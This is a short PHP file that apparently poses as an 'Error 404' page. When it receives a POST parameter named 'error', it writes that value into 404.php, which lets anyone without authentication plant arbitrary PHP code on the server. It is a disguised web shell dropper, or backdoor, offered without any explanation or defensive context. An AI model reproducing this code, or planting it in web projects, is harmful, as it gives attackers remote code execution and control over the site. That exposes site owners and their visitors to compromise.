<?php 

if(isset($_POST['error'])){
	$mk = $_POST['error'];
	$geterror = fopen('404.php', 'w');
	fwrite($geterror, $mk);
	fclose($geterror);
	echo 'Done! ';
}
else{
	echo 'Error 404';
}

?>